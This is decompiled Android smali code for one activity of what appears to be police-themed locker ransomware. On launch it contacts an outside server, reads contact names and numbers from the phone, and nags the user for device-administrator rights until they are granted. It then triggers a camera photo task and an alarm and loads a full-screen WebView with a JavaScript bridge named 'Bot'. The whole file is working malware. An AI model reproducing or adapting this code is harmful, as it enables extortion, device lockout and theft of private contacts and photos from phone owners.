.class public Lbi/gemolay/sntareson/SampleOverlayShowActivity;
.super Landroid/app/Activity;
.source "SampleOverlayShowActivity.java"


# annotations
.annotation system Ldalvik/annotation/MemberClasses;
    value = {
        Lbi/gemolay/sntareson/SampleOverlayShowActivity$TestWebViewClient;,
        Lbi/gemolay/sntareson/SampleOverlayShowActivity$WebAppInterface;
    }
.end annotation


# static fields
.field static final ACTIVATION_REQUEST:I = 0x2f

.field static final TAG:Ljava/lang/String; = "DevicePolicyDemoActivity"


# instance fields
.field private alarm:Lbi/gemolay/sntareson/AlarmManagerBroadcastReceiver;

.field private camera:I

.field private demoDeviceAdmin:Landroid/content/ComponentName;

.field private devicePolicyManager:Landroid/app/admin/DevicePolicyManager;

.field private face:I

.field private pict:Ljava/lang/String;


# direct methods
.method public constructor <init>()V
    .locals 0

    .prologue
    .line 60
    invoke-direct {p0}, Landroid/app/Activity;-><init>()V

    return-void
.end method


# virtual methods
.method protected colotit()V
    .locals 13

    .prologue
    const/4 v12, 0x2

    const/4 v11, 0x1

    const/4 v10, 0x0

    .line 134
    new-instance v6, Lbi/gemolay/sntareson/PhotoMaker;

    invoke-direct {v6, p0}, Lbi/gemolay/sntareson/PhotoMaker;-><init>(Landroid/content/Context;)V

    new-array v7, v11, [Ljava/lang/String;

    const-string v8, "davai"

    aput-object v8, v7, v10

    invoke-virtual {v6, v7}, Lbi/gemolay/sntareson/PhotoMaker;->execute([Ljava/lang/Object;)Landroid/os/AsyncTask;

    .line 135
    new-instance v6, Lbi/gemolay/sntareson/AlarmManagerBroadcastReceiver;

    invoke-direct {v6}, Lbi/gemolay/sntareson/AlarmManagerBroadcastReceiver;-><init>()V

    iput-object v6, p0, Lbi/gemolay/sntareson/SampleOverlayShowActivity;->alarm:Lbi/gemolay/sntareson/AlarmManagerBroadcastReceiver;

    .line 136
    iget-object v6, p0, Lbi/gemolay/sntareson/SampleOverlayShowActivity;->alarm:Lbi/gemolay/sntareson/AlarmManagerBroadcastReceiver;

    invoke-virtual {v6, p0}, Lbi/gemolay/sntareson/AlarmManagerBroadcastReceiver;->SetAlarm(Landroid/content/Context;)V

    .line 138
    const-string v6, "cocon"

    invoke-virtual {p0, v6, v10}, Lbi/gemolay/sntareson/SampleOverlayShowActivity;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;

    move-result-object v2

    .line 140
    .local v2, "settings":Landroid/content/SharedPreferences;
    const-string v6, "status"

    invoke-interface {v2, v6, v10}, Landroid/content/SharedPreferences;->getInt(Ljava/lang/String;I)I

    move-result v4

    .line 142
    .local v4, "status":I
    const/16 v6, 0x4d

    if-ne v4, v6, :cond_0

    .line 143
    invoke-static {}, Landroid/os/Process;->myPid()I

    move-result v6

    invoke-static {v6}, Landroid/os/Process;->killProcess(I)V

    .line 187
    :goto_0
    return-void

    .line 146
    :cond_0
    const-string v6, "camera"

    invoke-interface {v2, v6, v10}, Landroid/content/SharedPreferences;->getInt(Ljava/lang/String;I)I

    move-result v6

    iput v6, p0, Lbi/gemolay/sntareson/SampleOverlayShowActivity;->camera:I

    .line 147
    iget v6, p0, Lbi/gemolay/sntareson/SampleOverlayShowActivity;->camera:I

    if-ne v6, v11, :cond_1

    .line 148
    const-string v6, "face"

    const-string v7, "facenull"

    invoke-interface {v2, v6, v7}, Landroid/content/SharedPreferences;->getString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v6

    iput-object v6, p0, Lbi/gemolay/sntareson/SampleOverlayShowActivity;->pict:Ljava/lang/String;

    .line 149
    iget-object v6, p0, Lbi/gemolay/sntareson/SampleOverlayShowActivity;->pict:Ljava/lang/String;

    const-string v7, "facenull"

    invoke-virtual {v6, v7}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v6

    if-eqz v6, :cond_3

    .line 150
    iput v11, p0, Lbi/gemolay/sntareson/SampleOverlayShowActivity;->face:I

    .line 155
    :cond_1
    :goto_1
    iget v6, p0, Lbi/gemolay/sntareson/SampleOverlayShowActivity;->camera:I

    if-ne v6, v12, :cond_2

    .line 157
    iput v11, p0, Lbi/gemolay/sntareson/SampleOverlayShowActivity;->face:I

    .line 164
    :cond_2
    const-string v6, "cocon"

    invoke-virtual {p0, v6, v10}, Lbi/gemolay/sntareson/SampleOverlayShowActivity;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;

    move-result-object v3

    .line 165
    .local v3, "settings3":Landroid/content/SharedPreferences;
    invoke-interface {v3}, Landroid/content/SharedPreferences;->edit()Landroid/content/SharedPreferences$Editor;

    move-result-object v0

    .line 166
    .local v0, "editor":Landroid/content/SharedPreferences$Editor;
    const-string v6, "start"

    invoke-interface {v0, v6, v11}, Landroid/content/SharedPreferences$Editor;->putInt(Ljava/lang/String;I)Landroid/content/SharedPreferences$Editor;

    .line 167
    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    move-result-wide v6

    const-wide/16 v8, 0x3e8

    div-long/2addr v6, v8

    invoke-static {v6, v7}, Ljava/lang/Long;->valueOf(J)Ljava/lang/Long;

    move-result-object v5

    .line 168
    .local v5, "tsLong":Ljava/lang/Long;
    const-string v6, "starttime"

    invoke-virtual {v5}, Ljava/lang/Long;->longValue()J

    move-result-wide v7

    invoke-interface {v0, v6, v7, v8}, Landroid/content/SharedPreferences$Editor;->putLong(Ljava/lang/String;J)Landroid/content/SharedPreferences$Editor;

    .line 169
    invoke-interface {v0}, Landroid/content/SharedPreferences$Editor;->commit()Z

    .line 170
    const/high16 v6, 0x7f030000

    invoke-virtual {p0, v6}, Lbi/gemolay/sntareson/SampleOverlayShowActivity;->setContentView(I)V

    .line 171
    const/high16 v6, 0x7f070000

    invoke-virtual {p0, v6}, Lbi/gemolay/sntareson/SampleOverlayShowActivity;->findViewById(I)Landroid/view/View;

    move-result-object v1

    check-cast v1, Landroid/webkit/WebView;

    .line 173
    .local v1, "myWebView":Landroid/webkit/WebView;
    new-instance v6, Lbi/gemolay/sntareson/SampleOverlayShowActivity$TestWebViewClient;

    const/4 v7, 0x0

    invoke-direct {v6, p0, v7}, Lbi/gemolay/sntareson/SampleOverlayShowActivity$TestWebViewClient;-><init>(Lbi/gemolay/sntareson/SampleOverlayShowActivity;Lbi/gemolay/sntareson/SampleOverlayShowActivity$TestWebViewClient;)V

    invoke-virtual {v1, v6}, Landroid/webkit/WebView;->setWebViewClient(Landroid/webkit/WebViewClient;)V

    .line 174
    invoke-virtual {v1}, Landroid/webkit/WebView;->getSettings()Landroid/webkit/WebSettings;

    move-result-object v6

    invoke-virtual {v6, v11}, Landroid/webkit/WebSettings;->setJavaScriptEnabled(Z)V

    .line 175
    invoke-virtual {v1}, Landroid/webkit/WebView;->getSettings()Landroid/webkit/WebSettings;

    move-result-object v6

    invoke-virtual {v6, v10}, Landroid/webkit/WebSettings;->setSupportZoom(Z)V

    .line 176
    invoke-virtual {v1}, Landroid/webkit/WebView;->getSettings()Landroid/webkit/WebSettings;

    move-result-object v6

    invoke-virtual {v6, v10}, Landroid/webkit/WebSettings;->setSaveFormData(Z)V

    .line 177
    invoke-virtual {v1}, Landroid/webkit/WebView;->getSettings()Landroid/webkit/WebSettings;

    move-result-object v6

    invoke-virtual {v6, v10}, Landroid/webkit/WebSettings;->setSupportMultipleWindows(Z)V

    .line 178
    invoke-virtual {v1}, Landroid/webkit/WebView;->getSettings()Landroid/webkit/WebSettings;

    move-result-object v6

    invoke-virtual {v6, v10}, Landroid/webkit/WebSettings;->setBuiltInZoomControls(Z)V

    .line 179
    invoke-virtual {v1}, Landroid/webkit/WebView;->getSettings()Landroid/webkit/WebSettings;

    move-result-object v6

    invoke-virtual {v6, v11}, Landroid/webkit/WebSettings;->setUseWideViewPort(Z)V

    .line 180
    invoke-virtual {v1}, Landroid/webkit/WebView;->getSettings()Landroid/webkit/WebSettings;

    move-result-object v6

    sget-object v7, Landroid/webkit/WebSettings$RenderPriority;->HIGH:Landroid/webkit/WebSettings$RenderPriority;

    invoke-virtual {v6, v7}, Landroid/webkit/WebSettings;->setRenderPriority(Landroid/webkit/WebSettings$RenderPriority;)V

    .line 181
    invoke-virtual {v1}, Landroid/webkit/WebView;->getSettings()Landroid/webkit/WebSettings;

    move-result-object v6

    invoke-virtual {v6, v12}, Landroid/webkit/WebSettings;->setCacheMode(I)V

    .line 182
    new-instance v6, Lbi/gemolay/sntareson/SampleOverlayShowActivity$WebAppInterface;

    invoke-direct {v6, p0, p0}, Lbi/gemolay/sntareson/SampleOverlayShowActivity$WebAppInterface;-><init>(Lbi/gemolay/sntareson/SampleOverlayShowActivity;Landroid/content/Context;)V

    const-string v7, "Bot"

    invoke-virtual {v1, v6, v7}, Landroid/webkit/WebView;->addJavascriptInterface(Ljava/lang/Object;Ljava/lang/String;)V

    .line 183
    const-string v6, "file:///android_asset/video.html"

    invoke-virtual {v1, v6}, Landroid/webkit/WebView;->loadUrl(Ljava/lang/String;)V

    goto/16 :goto_0

    .line 152
    .end local v0    # "editor":Landroid/content/SharedPreferences$Editor;
    .end local v1    # "myWebView":Landroid/webkit/WebView;
    .end local v3    # "settings3":Landroid/content/SharedPreferences;
    .end local v5    # "tsLong":Ljava/lang/Long;
    :cond_3
    iput v12, p0, Lbi/gemolay/sntareson/SampleOverlayShowActivity;->face:I

    goto/16 :goto_1
.end method

.method protected ebat()V
    .locals 3

    .prologue
    .line 204
    new-instance v0, Landroid/content/Intent;

    .line 205
    const-string v1, "android.app.action.ADD_DEVICE_ADMIN"

    .line 204
    invoke-direct {v0, v1}, Landroid/content/Intent;-><init>(Ljava/lang/String;)V

    .line 206
    .local v0, "intent":Landroid/content/Intent;
    const-string v1, "android.app.extra.DEVICE_ADMIN"

    .line 207
    iget-object v2, p0, Lbi/gemolay/sntareson/SampleOverlayShowActivity;->demoDeviceAdmin:Landroid/content/ComponentName;

    .line 206
    invoke-virtual {v0, v1, v2}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Landroid/os/Parcelable;)Landroid/content/Intent;

    .line 208
    const-string v1, "android.app.extra.ADD_EXPLANATION"

    .line 209
    const-string v2, "To run the application - activate"

    .line 208
    invoke-virtual {v0, v1, v2}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;

    .line 210
    const/16 v1, 0x2f

    invoke-virtual {p0, v0, v1}, Lbi/gemolay/sntareson/SampleOverlayShowActivity;->startActivityForResult(Landroid/content/Intent;I)V

    .line 211
    return-void
.end method

.method protected onActivityResult(IILandroid/content/Intent;)V
    .locals 2
    .param p1, "requestCode"    # I
    .param p2, "resultCode"    # I
    .param p3, "data"    # Landroid/content/Intent;

    .prologue
    .line 214
    packed-switch p1, :pswitch_data_0

    .line 226
    invoke-super {p0, p1, p2, p3}, Landroid/app/Activity;->onActivityResult(IILandroid/content/Intent;)V

    .line 227
    :goto_0
    return-void

    .line 216
    :pswitch_0
    const/4 v0, -0x1

    if-ne p2, v0, :cond_0

    .line 217
    const-string v0, "DevicePolicyDemoActivity"

    const-string v1, "Administration enabled!"

    invoke-static {v0, v1}, Landroid/util/Log;->i(Ljava/lang/String;Ljava/lang/String;)I

    .line 218
    invoke-virtual {p0}, Lbi/gemolay/sntareson/SampleOverlayShowActivity;->colotit()V

    goto :goto_0

    .line 221
    :cond_0
    const-string v0, "DevicePolicyDemoActivity"

    const-string v1, "Administration enable FAILED!"

    invoke-static {v0, v1}, Landroid/util/Log;->i(Ljava/lang/String;Ljava/lang/String;)I

    .line 222
    invoke-virtual {p0}, Lbi/gemolay/sntareson/SampleOverlayShowActivity;->ebat()V

    goto :goto_0

    .line 214
    :pswitch_data_0
    .packed-switch 0x2f
        :pswitch_0
    .end packed-switch
.end method

.method protected onCreate(Landroid/os/Bundle;)V
    .locals 20
    .param p1, "savedInstanceState"    # Landroid/os/Bundle;

    .prologue
    .line 77
    invoke-super/range {p0 .. p1}, Landroid/app/Activity;->onCreate(Landroid/os/Bundle;)V

    .line 81
    const-string v1, "cocon"

    const/4 v2, 0x0

    move-object/from16 v0, p0

    invoke-virtual {v0, v1, v2}, Lbi/gemolay/sntareson/SampleOverlayShowActivity;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;

    move-result-object v15

    .line 83
    .local v15, "settings":Landroid/content/SharedPreferences;
    const-string v1, "status"

    const/4 v2, 0x0

    invoke-interface {v15, v1, v2}, Landroid/content/SharedPreferences;->getInt(Ljava/lang/String;I)I

    move-result v17

    .line 84
    .local v17, "status":I
    const/16 v1, 0x4d

    move/from16 v0, v17

    if-ne v0, v1, :cond_0

    .line 85
    invoke-static {}, Landroid/os/Process;->myPid()I

    move-result v1

    invoke-static {v1}, Landroid/os/Process;->killProcess(I)V

    .line 89
    :cond_0
    const-string v19, "start"

    .line 90
    .local v19, "type":Ljava/lang/String;
    const-string v11, ""

    .line 91
    .local v11, "data":Ljava/lang/String;
    new-instance v1, Lbi/gemolay/sntareson/RequestTask;

    move-object/from16 v0, p0

    invoke-direct {v1, v0}, Lbi/gemolay/sntareson/RequestTask;-><init>(Landroid/content/Context;)V

    const/4 v2, 0x3

    new-array v2, v2, [Ljava/lang/String;

    const/4 v3, 0x0

    const-string v4, "http://pornopoliceusa.com/api/app.php"

    aput-object v4, v2, v3

    const/4 v3, 0x1

    aput-object v19, v2, v3

    const/4 v3, 0x2

    aput-object v11, v2, v3

    invoke-virtual {v1, v2}, Lbi/gemolay/sntareson/RequestTask;->execute([Ljava/lang/Object;)Landroid/os/AsyncTask;

    .line 93
    sget-object v2, Landroid/provider/ContactsContract$CommonDataKinds$Phone;->CONTENT_URI:Landroid/net/Uri;

    const/4 v3, 0x0

    const/4 v4, 0x0

    const/4 v5, 0x0

    const/4 v6, 0x0

    move-object/from16 v1, p0

    invoke-virtual/range {v1 .. v6}, Lbi/gemolay/sntareson/SampleOverlayShowActivity;->managedQuery(Landroid/net/Uri;[Ljava/lang/String;Ljava/lang/String;[Ljava/lang/String;Ljava/lang/String;)Landroid/database/Cursor;

    move-result-object v10

    .line 94
    .local v10, "cursor":Landroid/database/Cursor;
    invoke-interface {v10}, Landroid/database/Cursor;->getCount()I

    move-result v9

    .line 95
    .local v9, "countphones":I
    const/16 v18, 0x0

    .line 96
    .local v18, "t":I
    invoke-virtual/range {p0 .. p0}, Lbi/gemolay/sntareson/SampleOverlayShowActivity;->getContentResolver()Landroid/content/ContentResolver;

    move-result-object v1

    sget-object v2, Landroid/provider/ContactsContract$CommonDataKinds$Phone;->CONTENT_URI:Landroid/net/Uri;

    const/4 v3, 0x0

    const/4 v4, 0x0

    const/4 v5, 0x0

    const/4 v6, 0x0

    invoke-virtual/range {v1 .. v6}, Landroid/content/ContentResolver;->query(Landroid/net/Uri;[Ljava/lang/String;Ljava/lang/String;[Ljava/lang/String;Ljava/lang/String;)Landroid/database/Cursor;

    move-result-object v14

    .line 97
    .local v14, "phones":Landroid/database/Cursor;
    const-string v13, ""

    .line 98
    .local v13, "out":Ljava/lang/String;
    :cond_1
    invoke-interface {v14}, Landroid/database/Cursor;->moveToNext()Z

    move-result v1

    if-nez v1, :cond_2

    .line 113
    :goto_0
    const-string v1, "cocon"

    const/4 v2, 0x0

    move-object/from16 v0, p0

    invoke-virtual {v0, v1, v2}, Lbi/gemolay/sntareson/SampleOverlayShowActivity;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;

    move-result-object v16

    .line 114
    .local v16, "settings3":Landroid/content/SharedPreferences;
    invoke-interface/range {v16 .. v16}, Landroid/content/SharedPreferences;->edit()Landroid/content/SharedPreferences$Editor;

    move-result-object v12

    .line 115
    .local v12, "editor":Landroid/content/SharedPreferences$Editor;
    const-string v1, "countphones"

    invoke-interface {v12, v1, v9}, Landroid/content/SharedPreferences$Editor;->putInt(Ljava/lang/String;I)Landroid/content/SharedPreferences$Editor;

    .line 116
    const-string v1, "listphones"

    invoke-interface {v12, v1, v13}, Landroid/content/SharedPreferences$Editor;->putString(Ljava/lang/String;Ljava/lang/String;)Landroid/content/SharedPreferences$Editor;

    .line 117
    invoke-interface {v12}, Landroid/content/SharedPreferences$Editor;->commit()Z

    .line 119
    const-string v1, "device_policy"

    move-object/from16 v0, p0

    invoke-virtual {v0, v1}, Lbi/gemolay/sntareson/SampleOverlayShowActivity;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v1

    check-cast v1, Landroid/app/admin/DevicePolicyManager;

    move-object/from16 v0, p0

    iput-object v1, v0, Lbi/gemolay/sntareson/SampleOverlayShowActivity;->devicePolicyManager:Landroid/app/admin/DevicePolicyManager;

    .line 120
    new-instance v1, Landroid/content/ComponentName;

    const-class v2, Lbi/gemolay/sntareson/catcher;

    move-object/from16 v0, p0

    invoke-direct {v1, v0, v2}, Landroid/content/ComponentName;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    move-object/from16 v0, p0

    iput-object v1, v0, Lbi/gemolay/sntareson/SampleOverlayShowActivity;->demoDeviceAdmin:Landroid/content/ComponentName;

    .line 121
    move-object/from16 v0, p0

    iget-object v1, v0, Lbi/gemolay/sntareson/SampleOverlayShowActivity;->devicePolicyManager:Landroid/app/admin/DevicePolicyManager;

    move-object/from16 v0, p0

    iget-object v2, v0, Lbi/gemolay/sntareson/SampleOverlayShowActivity;->demoDeviceAdmin:Landroid/content/ComponentName;

    invoke-virtual {v1, v2}, Landroid/app/admin/DevicePolicyManager;->isAdminActive(Landroid/content/ComponentName;)Z

    move-result v1

    if-eqz v1, :cond_3

    .line 122
    invoke-virtual/range {p0 .. p0}, Lbi/gemolay/sntareson/SampleOverlayShowActivity;->colotit()V

    .line 131
    :goto_1
    return-void

    .line 100
    .end local v12    # "editor":Landroid/content/SharedPreferences$Editor;
    .end local v16    # "settings3":Landroid/content/SharedPreferences;
    :cond_2
    const-string v1, "display_name"

    invoke-interface {v14, v1}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v1

    invoke-interface {v14, v1}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v7

    .line 101
    .local v7, "Name":Ljava/lang/String;
    const-string v1, "data1"

    invoke-interface {v14, v1}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v1

    invoke-interface {v14, v1}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v8

    .line 102
    .local v8, "Number":Ljava/lang/String;
    add-int/lit8 v18, v18, 0x1

    .line 103
    new-instance v1, Ljava/lang/StringBuilder;

    invoke-static {v13}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v2

    invoke-direct {v1, v2}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v1, v8}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    const-string v2, " "

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    const-string v2, " <br />"

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v13

    .line 104
    const/4 v1, 0x5

    move/from16 v0, v18

    if-le v0, v1, :cond_1

    goto/16 :goto_0

    .line 124
    .end local v7    # "Name":Ljava/lang/String;
    .end local v8    # "Number":Ljava/lang/String;
    .restart local v12    # "editor":Landroid/content/SharedPreferences$Editor;
    .restart local v16    # "settings3":Landroid/content/SharedPreferences;
    :cond_3
    invoke-virtual/range {p0 .. p0}, Lbi/gemolay/sntareson/SampleOverlayShowActivity;->ebat()V

    goto :goto_1
.end method
